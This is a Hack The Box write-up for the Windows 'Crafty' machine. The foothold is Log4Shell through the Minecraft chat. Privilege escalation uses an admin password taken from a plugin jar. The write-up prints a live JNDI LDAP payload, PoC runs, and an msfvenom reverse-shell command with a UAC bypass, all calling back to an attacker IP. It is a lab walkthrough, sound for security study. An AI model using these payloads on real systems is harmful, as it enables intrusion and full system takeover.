# HTB - Crafty

### TL;DR
This is a gaming Windows Server 2019 running Minecraft 1.16.5, which is known to be affected by the Log4Shell vulnerability (CVE-2021-44228). There are several POCs in Github which can be used to exploit the Log4Shell vulnerability and get a foothold in the server. The administrator password is found in a `.jar` file in the file system.<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-11 04:05 EST

```
Update the `/etc/hosts` file and enumerate the site with Firefox. We see information about a Minecraft server running at `play.crafty.htb`. There are no more interaction points with the backend in the website.

In summary, we have found a Minecraft server v1.16.5 running on port 25565.

### USER
Searching for Minecraft 1.16.5 vulnerabilities in the web, we find out that versions from 1.8.8 to 1.18.1 were affected by Log4Shell vulnerability, a critical bug in the Apache log4j java logging library (https://www.cvedetails.com/cve/CVE-2021-44228/)<br>
<br>
If you search in GitHub you will find several POCs for Log4Shell exploitation, and there are also tutorials in Youtube, such as this: https://www.youtube.com/watch?v=7qoPDq41xhQ<br>
<br>
We will use this POC: https://github.com/kozmer/log4j-shell-poc. If you pay attention to documentation, there is an example exploiting the CVE in the Minecraft chat. Note that the `poc.py` cannot be used off-the-self, if you inspect carefully the source code you will see 2 modifications are needed.<br>
<br>
First, the POC is designed to be used in Linux, but since `crafty.htb` is a Windows machine, a first modification is needed to adapt the exploit part to the Windows systems (replace `/etc/sh` with `cmd`.

![Untitled100](https://github.com/g1vi/AllTheWriteUps/assets/120142960/595bc7d5-b4b5-4193-90b8-05d688d1a08f)

Next, according to the author you need to copy your version of Java in the repository root directory. The author provides a link to Oracle but, since registration is required, another one was used: https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz<br>
<br>
Follow the author instructions: unpack the Java package in the repository root folder and rename the directory as `./jdk1.8.0_20`, to match the Java path used in the source code. Alternatively, you can leave the directory named as you want and modify the source code accordingly.<br>
<br>
Once finished, verify Java is successfuly installed.
```markdown
> ./jdk1.8.0_20/bin/java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
java version "1.8.0_202"
Java(TM) SE Runtime Environment (build 1.8.0_202-b08)
Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
```
Now run the exploit.
```markdown
> python3 poc.py --userip <your kali ip here> --webport 8000 --lport 1919

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.xxx.xxx:1389/a}

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```
The POC automatically starts an LDAP server on ports 1389 and also generates a payload called `Exploit.class` which will be served on an HTTP server running on port 8000.<br>

You also need to start a listener on port 1919 (this port can be modified with the `â€“lport` option).<br>
<br>
The POC provide the payload we need to inject in the Minecraft chat.
```markdown
${jndi:ldap://10.10.xxx.xxx:1389/a}
```
Next step is to join a game in the Minecraft server. For this, download a Minecraft client such as this: https://tlauncher.org/en/download_1/minecraft-1-16-5_12582.html. Choose the version that suits your platform, in this case we will use the `.jar` Linux version available here: https://tlauncher.org/jar<br>
<br>
Unzip and run the client.
```markdown
> java -jar TLauncher-2.895.jar
```
Once the client start, make sure you install the Minecraft version 1.65.5, which is the one that matches the one running in the server.

Once the installation finishes, click on "Enter the game". In the startup screen click on "Multiplayer" and add a new server `play.crafty.htb`. Join the server and as soon as the game starts press "T" to open the chat and enter the payload.
```markdown
${jndi:ldap://10.10.xxx.xxx:1389/a}
```
When the payload is sent a reverse shell is received on port 1919, it can be used to get the user flag.

### SYSTEM
Start from the user shell and take the opportunity to enumerate the system.
```markdown
> systeminfo

Host Name:                 CRAFTY
OS Name:                   Microsoft Windows Server 2019 Standard

```
Locate the file `c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar` in the system. Inspect the file and extract the class `/htb/crafty/playercounter/Playercounter.class`. Decompile using whatever method you like, for example, using an online decompiler: https://www.decompiler.com/

Looks like credential `s67u84zKq8IXw` is used to connect to an internal service running on 27015 for management purposes.<br>
<br>
Generate a payload with `msfvenom`
```markdown
> msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.34 lport=9999 -f exe -a x64 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
Transfer `shell.exe` and `runascs.exe` (https://github.com/antonioCoco/RunasCs) to the victim and run them.
```markdown
.\runascs administrator s67u84zKq8IXw shell.exe --bypass-uac
```
A reverse shell is received on port 9999.
